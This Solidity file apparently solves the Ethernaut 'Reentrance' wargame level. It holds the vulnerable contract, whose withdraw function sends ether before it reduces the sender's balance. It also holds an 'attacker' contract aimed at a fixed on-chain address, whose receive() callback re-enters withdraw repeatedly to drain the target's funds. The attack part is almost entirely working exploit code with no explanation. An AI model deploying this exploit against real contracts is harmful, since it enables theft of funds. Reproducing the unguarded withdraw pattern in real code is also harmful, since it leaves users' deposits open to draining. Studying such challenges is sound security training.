// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract attacker {
  Reentrance constant toExploit = Reentrance(0x1Cb0695d149580cC8aA462693e06c5AbcAEc5f33);/*0x1Cb0695d149580cC8aA462693e06c5AbcAEc5f33*/
  constructor() public payable {
    toExploit.donate{value:0.001 ether}(address(this));
    toExploit.withdraw(0.001 ether);
  }
  receive() external payable {
    toExploit.withdraw(0.001 ether);
  }

}